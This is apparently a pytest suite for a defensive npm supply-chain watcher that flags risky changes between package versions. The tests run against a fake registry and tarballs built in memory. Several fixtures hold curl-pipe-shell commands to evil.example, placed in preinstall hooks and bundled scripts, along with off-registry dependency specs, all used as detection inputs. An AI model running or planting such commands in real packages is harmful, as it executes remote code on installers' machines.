"""npm watch: a version compared with the one before it, from tarballs built in memory and a registry served by a fake fetch. No network; nothing is installed."""

from __future__ import annotations

import base64
import hashlib
import io
import json
import tarfile
from datetime import UTC, datetime, timedelta
from urllib.parse import unquote

import pytest

from diff_sentry.npm import NpmWatcher, parse_npm_packages, parse_packument, semver_key
from diff_sentry.releases import release_event, run_id_for, scan_release

_REPO = {"repository": "https://github.com/acme/widget", "path": ".github/workflows/release.yml"}


def _tarball(version: str, scripts: dict | None = None, files: dict | None = None, deps: dict | None = None) -> bytes:
    manifest = {"name": "@acme/widget", "version": version, "main": "index.js", "scripts": {"test": "jest", **(scripts or {})},
                "dependencies": deps or {"left-pad": "^1.3.0"}}
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, text in {"package.json": json.dumps(manifest, indent=2) + "\n", "index.js": "module.exports = 1;\n",
                           **(files or {})}.items():
            data = text.encode()
            info = tarfile.TarInfo(f"package/{path}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


class _Registry:
    """A fake npm registry: an abbreviated packument, tarballs, and SLSA provenance per version."""

    def __init__(self, name: str = "@acme/widget"):
        self.name = name
        self.tarballs: dict[str, bytes] = {}
        self.provenance: dict[str, dict] = {}
        self.etag = "1"
        self.calls: list[str] = []
        self.wrong_subject: set[str] = set()
        self.foreign: set[str] = set()
        # other packages a version may depend on: name -> (created, whether a version runs a script at install)
        self.others: dict[str, tuple[str, bool]] = {"left-pad": ("2016-03-23T00:00:00Z", False)}
        self.padded: set[str] = set()                   # packages whose full document is padded past any bound
        self.published: dict[str, str] = {}             # this package's publish time per version, in its full document

    def publish(self, version: str, data: bytes, publisher: dict | None = _REPO) -> None:
        self.tarballs[version] = data
        if publisher is not None:
            self.provenance[version] = publisher
        self.etag = str(int(self.etag) + 1)

    def _base(self) -> str:
        return self.name.rsplit("/", 1)[-1]

    def packument(self) -> bytes:
        versions = {}
        for v, data in self.tarballs.items():
            host = "evil.example" if v in self.foreign else "registry.npmjs.org"
            dist = {"tarball": f"https://{host}/{self.name}/-/{self._base()}-{v}.tgz",
                    "integrity": "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()}
            if v in self.provenance:
                dist["attestations"] = {"url": f"https://registry.npmjs.org/-/npm/v1/attestations/{self.name}@{v}",
                                        "provenance": {"predicateType": "https://slsa.dev/provenance/v1"}}
            versions[v] = {"name": self.name, "version": v, "dist": dist}
        return json.dumps({"name": self.name, "versions": versions}).encode()

    def __call__(self, url: str, headers: dict, limit: int):
        status, resp_headers, body = self._serve(url, headers)
        if len(body) > limit:                         # as the real fetch does
            raise ValueError(f"{url} is larger than {limit} bytes")
        return status, resp_headers, body

    def _serve(self, url: str, headers: dict):
        self.calls.append(url)
        if url.startswith("https://registry.npmjs.org/-/npm/v1/attestations/"):
            v = url.rsplit("@", 1)[1]
            digest = hashlib.sha512(b"other" if v in self.wrong_subject else self.tarballs[v]).hexdigest()
            statement = {"subject": [{"name": "pkg:npm/x", "digest": {"sha512": digest}}],
                         "predicate": {"buildDefinition": {"externalParameters": {"workflow": self.provenance[v]}}}}
            att = {"predicateType": "https://slsa.dev/provenance/v1",
                   "bundle": {"dsseEnvelope": {"payload": base64.b64encode(json.dumps(statement).encode()).decode()}}}
            return 200, {}, json.dumps({"attestations": [{"predicateType": "https://github.com/npm/attestation/tree/main/specs/publish/v0.1"}, att]}).encode()
        if "/-/" in url:
            v = url.split(f"/-/{self._base()}-", 1)[1][:-4]
            return (200, {}, self.tarballs[v]) if v in self.tarballs else (404, {}, b"")
        name = unquote(url.removeprefix("https://registry.npmjs.org/"))
        if name != self.name:
            if name not in self.others:
                return 404, {}, b""
            created, scripted = self.others[name]
            versions = {"1.0.0": {"name": name, "version": "1.0.0", **({"hasInstallScript": True} if scripted else {})}}
            full = headers.get("Accept") == "application/json"
            pad = "x" * (65 << 20) if full and name in self.padded else ""
            return 200, {}, json.dumps({"name": name, "versions": versions, "time": {"created": created}, "pad": pad}).encode()
        if headers.get("Accept") == "application/json":
            return 200, {}, json.dumps({**json.loads(self.packument()), "time": self.published}).encode()
        if headers.get("If-None-Match") == self.etag:
            return 304, {}, b""
        return 200, {"ETag": self.etag}, self.packument()


def _event(reg: _Registry, version: str) -> dict:
    return release_event(reg.name, version, parse_packument(reg.packument()), reg, registry="npm")


def _rules(event: dict, floor_only: bool = True) -> set[str]:
    from diff_sentry.cli import _baseline_indicators
    from diff_sentry.schema import SIGNAL_SEVERITY_FLOOR, severity_rank

    return {h["rule"] for h in _baseline_indicators(event)
            if not floor_only or severity_rank(h["severity"]) >= severity_rank(SIGNAL_SEVERITY_FLOOR)}


def test_semver_orders_numbers_and_pre_releases():
    order = ["1.0.0-alpha", "1.0.0-alpha.1", "1.0.0-alpha.beta", "1.0.0-beta.2", "1.0.0-beta.11", "1.0.0-rc.1", "1.0.0",
             "1.2.0", "1.10.0"]
    assert sorted(order, key=semver_key) == order
    assert semver_key("1.0.0-rc.1").is_prerelease and not semver_key("1.0.0+build.5").is_prerelease
    assert semver_key("1.0") is None and semver_key("latest") is None


def test_names_are_checked():
    assert parse_npm_packages(["left-pad @acme/widget", "# c\nJSONStream, left-pad"]) == ["left-pad", "@acme/widget", "JSONStream"]
    for bad in ("../x", "@acme/../x", "a b/c", "@/x", "x" * 215):
        with pytest.raises(ValueError):
            parse_npm_packages([bad])


def test_a_tarball_off_the_registry_is_left_out():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.1.0", _tarball("1.1.0"))
    reg.foreign.add("1.1.0")
    assert [f.version for f in parse_packument(reg.packument())] == ["1.0.0"]


def test_a_clean_version_raises_nothing():
    reg = _Registry()
    reg.publish("1.9.0", _tarball("1.9.0"))
    reg.publish("1.10.0", _tarball("1.10.0", files={"lib.js": "exports.x = 2;\n"}))
    event = _event(reg, "1.10.0")
    facts = event["release"]
    assert facts["previous"] == "1.9.0" and event["repo"] == "npm/@acme/widget"
    assert facts["publishers"] == facts["previous_publishers"] == ["github:acme/widget:.github/workflows/release.yml::"]
    assert {f["filename"] for f in event["files"]} == {"npm/package.json", "npm/lib.js"}
    assert not _rules(event)


def test_an_install_script_added_is_high():
    # the shape of the 2025 worms: a preinstall that runs a bundled payload
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1", {"preinstall": "node setup_bun.js"}, {"setup_bun.js": "require('child_process');\n"}))
    event = _event(reg, "1.0.1")
    assert event["release"]["install_scripts_added"] == ["preinstall: node setup_bun.js"]
    assert "npm-install-script-added" in _rules(event)


def test_an_install_script_changed_is_medium_and_a_gyp_build_counts():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0", {"postinstall": "node build.js"}))
    reg.publish("1.0.1", _tarball("1.0.1", {"postinstall": "node build.js && node x.js"}))
    event = _event(reg, "1.0.1")
    assert "npm-install-script-changed" in _rules(event, floor_only=False) and "npm-install-script-changed" not in _rules(event)
    reg.publish("1.0.2", _tarball("1.0.2", {"postinstall": "node build.js && node x.js"}, {"binding.gyp": "{}\n"}))
    assert _event(reg, "1.0.2")["release"]["install_scripts_added"] == ["install: node-gyp rebuild (implied by binding.gyp)"]


def test_a_new_dependency_is_low():
    reg = _Registry()
    reg.others["totally-legit"] = ("2019-01-01T00:00:00Z", False)
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1", deps={"left-pad": "^1.3.0", "totally-legit": "1.0.0"}))
    event = _event(reg, "1.0.1")
    assert event["release"]["new_requires"] == ["totally-legit"] and not _rules(event)


@pytest.mark.parametrize(("other", "rule"), [
    (("2019-01-01T00:00:00Z", True), "npm-dependency-runs-at-install"),      # the dependency runs a script at install
    (((datetime.now(UTC) - timedelta(days=2)).isoformat(), False), "npm-dependency-young"),     # published days ago
    (None, "npm-dependency-young"),                                          # not on the registry
])
def test_a_new_dependency_that_runs_at_install_or_is_new_is_high(other, rule):
    # a compromised version can carry nothing itself and depend on a package published hours before
    reg = _Registry()
    if other is not None:
        reg.others["plain-crypto-js"] = other
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1", deps={"left-pad": "^1.3.0", "plain-crypto-js": "^4.2.1"}))
    assert rule in _rules(_event(reg, "1.0.1"))


def test_provenance_dropped_or_from_another_repository_signals():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1"), publisher=None)
    assert "release-attestation-dropped" in _rules(_event(reg, "1.0.1"))
    for publisher, rule in (({**_REPO, "repository": "https://github.com/acme-/widget"}, "release-publisher-lookalike"),
                            ({**_REPO, "path": ".github/workflows/other.yml"}, "release-publisher-changed")):
        reg = _Registry()
        reg.publish("1.0.0", _tarball("1.0.0"))
        reg.publish("1.0.1", _tarball("1.0.1"), publisher=publisher)
        assert rule in _rules(_event(reg, "1.0.1"))


def test_provenance_that_names_another_tarball_is_not_trusted():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1"))
    reg.wrong_subject.add("1.0.1")
    event = _event(reg, "1.0.1")
    assert event["release"]["publishers"] == [] and "release-not-fully-read" in _rules(event)


def test_a_tarball_that_does_not_match_its_integrity_is_not_read():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1"))
    good = reg.packument()
    reg.tarballs["1.0.1"] = _tarball("1.0.1", {"preinstall": "curl -s https://evil.example/x | sh"})
    files = parse_packument(good)
    event = release_event(reg.name, "1.0.1", files, reg, registry="npm")
    assert "release-not-fully-read" in _rules(event) and not event["files"]


def test_the_rules_read_the_new_files():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1", files={"scripts/fetch.sh": "curl -sSL https://evil.example/p.sh | bash\n"}))
    assert "curl-pipe-shell" in _rules(_event(reg, "1.0.1"))


def test_the_watcher_judges_each_new_version_once(tmp_path):
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    w = NpmWatcher([reg.name], state_dir=str(tmp_path / "s"), out_dir=str(tmp_path / "o"), fetch=reg, emit=False)
    try:
        assert w.poll_once() == []                                   # first sight: the baseline
        reg.publish("1.0.1", _tarball("1.0.1", {"postinstall": "node x.js"}))
        reg.publish("2.0.0-rc.1", _tarball("2.0.0-rc.1"))
        results = w.poll_once()
        assert [(r["version"], r["previous"]) for r in results] == [("1.0.1", "1.0.0"), ("2.0.0-rc.1", "1.0.1")]
        assert results[0]["run_id"] == run_id_for(reg.name, "1.0.1", registry="npm") == "npm___acme_widget-1.0.1"
        assert ("npm-install-script-added", "high", "@acme/widget 1.0.1") in results[0]["indicators"]
        assert w.poll_once() == []                                   # 304: nothing new
        assert any(u == "https://registry.npmjs.org/@acme%2Fwidget" for u in reg.calls)
    finally:
        w.close()


def test_scan_release_reads_npm_facts_alone():
    hits = scan_release({"package": "x", "version": "1.0.1", "install_scripts_added": ["postinstall: node x.js"]})
    assert [(h.rule, h.severity) for h in hits] == [("npm-install-script-added", "high")]


# ── manifests as npm reads them ──────────────────────────────────────────────────────────────────────────

def _raw_tarball(entries: list[tuple[str, bytes]]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in entries:
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _manifest_bytes(scripts: dict | None = None, **extra) -> bytes:
    return json.dumps({"name": "@acme/widget", "version": "1.0.1", "scripts": scripts or {}, **extra}).encode()


_POST = {"postinstall": "node index.js"}       # names a file the previous version had: only the install-script fact sees it


def _scripts_added(entries: list[tuple[str, bytes]]) -> tuple[list[str], set[str]]:
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _raw_tarball(entries + [("package/index.js", b"module.exports = 1;\n")]))
    event = _event(reg, "1.0.1")
    return event["release"]["install_scripts_added"], _rules(event)


@pytest.mark.parametrize("body", [
    b"\xef\xbb\xbf" + _manifest_bytes(_POST),                                          # a BOM npm drops
    _manifest_bytes(_POST, description="cafX").replace(b"cafX", b"caf\xff"),           # a byte that is not UTF-8
    _manifest_bytes(_POST, description="x" * (1 << 20) + "y"),                          # past the screen's text limit
])
def test_a_manifest_npm_reads_is_read(body):
    added, rules = _scripts_added([("package/package.json", body)])
    assert added == ["postinstall: node index.js"] and "npm-install-script-added" in rules


def test_a_bundled_dependency_install_script_is_read():
    added, rules = _scripts_added([
        ("package/package.json", _manifest_bytes(bundleDependencies=["helper"])),
        ("package/node_modules/helper/package.json", json.dumps({"name": "helper", "scripts": {"postinstall": "node ."}}).encode()),
        ("package/node_modules/@s/gyp/package.json", b"{}"), ("package/node_modules/@s/gyp/binding.gyp", b"{}")])
    assert added == ["node_modules/@s/gyp install: node-gyp rebuild (implied by binding.gyp)",
                     "node_modules/helper postinstall: node ."]
    assert "npm-install-script-added" in rules


@pytest.mark.parametrize("entries", [
    [("package.json", _manifest_bytes()), ("package/package.json", _manifest_bytes(_POST))],         # a root decoy npm drops
    [("package/package.json", _manifest_bytes()), ("package/package.json", _manifest_bytes(_POST))],  # the last entry stands
    [("./package/package.json", _manifest_bytes(_POST))],
])
def test_the_manifest_npm_installs_is_the_one_read(entries):
    added, _ = _scripts_added(entries)
    assert added == ["postinstall: node index.js"]


@pytest.mark.parametrize("body", [b"{not json", b"[" * 100_000 + b"]" * 100_000, b"[]"])
def test_a_manifest_that_cannot_be_read_alerts(body):
    added, rules = _scripts_added([("package/package.json", body)])
    assert added == [] and "release-not-fully-read" in rules


def test_a_tarball_without_a_manifest_alerts():
    _, rules = _scripts_added([])
    assert "release-not-fully-read" in rules


def test_provenance_with_no_sha512_to_bind_is_not_trusted():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1"))
    files = parse_packument(reg.packument())
    for f in files:
        f.sha512 = ""
    event = release_event(reg.name, "1.0.1", files, reg, registry="npm")
    assert event["release"]["publishers"] == [] and "release-not-fully-read" in _rules(event)


@pytest.mark.parametrize("spec", ["github:evil/left-pad", "https://evil.example/lp.tgz", "git+ssh://git@github.com/e/lp.git",
                                  "evil/left-pad", "file:../lp", "npm:totally-legit@1.0.0", "./vendor/lp"])
def test_a_dependency_from_outside_the_registry_is_high(spec):
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0"))
    reg.publish("1.0.1", _tarball("1.0.1", deps={"left-pad": spec}))
    event = _event(reg, "1.0.1")
    assert event["release"]["dependency_sources"] == [f"left-pad: {spec}"] and "npm-dependency-source" in _rules(event)


def test_a_registry_range_that_moves_is_not_a_source_change():
    reg = _Registry()
    reg.publish("1.0.0", _tarball("1.0.0", deps={"left-pad": "github:acme/left-pad"}))
    reg.publish("1.0.1", _tarball("1.0.1", deps={"left-pad": "github:acme/left-pad", "x": "^2 || >=3.1.0-rc.1"}))
    assert _event(reg, "1.0.1")["release"]["dependency_sources"] == []     # the same source as before, and a range


def test_a_peer_or_bundled_dependency_source_is_read():
    _, rules = _scripts_added([
        ("package/package.json", _manifest_bytes(peerDependencies={"react": "https://evil.example/react.tgz"})),
        ("package/node_modules/helper/package.json", json.dumps({"dependencies": {"y": "github:e/y"}}).encode())])
    assert "npm-dependency-source" in rules


@pytest.mark.parametrize("entries", [
    [("package/package.json", _manifest_bytes()), ("package/Package.json", _manifest_bytes(_POST))],
    [("package/Package.json", _manifest_bytes(_POST)), ("package/package.json", _manifest_bytes())],
])
def test_manifests_that_differ_only_in_case_alert_and_both_are_read(entries):
    added, rules = _scripts_added(entries)
    assert any("postinstall: node index.js" in a for a in added) and "release-not-fully-read" in rules


def test_a_binding_gyp_in_any_case_implies_a_build():
    added, _ = _scripts_added([("package/package.json", _manifest_bytes()), ("package/Binding.gyp", b"{}")])
    assert added == ["install: node-gyp rebuild (implied by binding.gyp)"]


def test_a_path_that_climbs_is_not_read():
    added, _ = _scripts_added([("package/package.json", _manifest_bytes()),
                               ("package/node_modules/../package.json", _manifest_bytes(_POST))])
    assert added == []



def _young_case(reg: _Registry, created: str, deps_new: dict | None = None, deps_old: dict | None = None, **kw) -> set[str]:
    reg.others["fresh-helper"] = (created, False)
    reg.publish("1.0.0", _tarball("1.0.0", deps=deps_old))
    reg.publish("1.0.1", _tarball("1.0.1", deps=deps_new or {"left-pad": "^1.3.0", "fresh-helper": "^1.0.0"}, **kw))
    return _rules(_event(reg, "1.0.1"))


def test_age_is_measured_as_of_the_version_not_the_clock():
    # a replay long after: the helper was created three days before the version was published
    reg = _Registry()
    reg.published = {"1.0.1": "2026-03-31T00:00:00+00:00"}
    assert "npm-dependency-young" in _young_case(reg, "2026-03-28T00:00:00+00:00")


def test_a_padded_full_document_is_not_an_established_package():
    reg = _Registry()
    reg.padded.add("fresh-helper")
    rules = _young_case(reg, "2019-01-01T00:00:00Z")
    assert "release-not-fully-read" in rules and "npm-dependency-young" not in rules


def test_a_dependency_moved_onto_the_registry_or_added_in_a_bundled_package_is_looked_up():
    recent = (datetime.now(UTC) - timedelta(days=1)).isoformat()
    moved = _young_case(_Registry(), recent, deps_new={"left-pad": "^1.3.0", "fresh-helper": "^1.0.0"},
                        deps_old={"left-pad": "^1.3.0", "fresh-helper": "github:acme/fresh-helper"})
    assert "npm-dependency-young" in moved
    bundled = _young_case(_Registry(), recent, deps_new={"left-pad": "^1.3.0"}, files={
        "node_modules/helper/package.json": json.dumps({"name": "helper", "dependencies": {"fresh-helper": "1.0.0"}})})
    assert "npm-dependency-young" in bundled
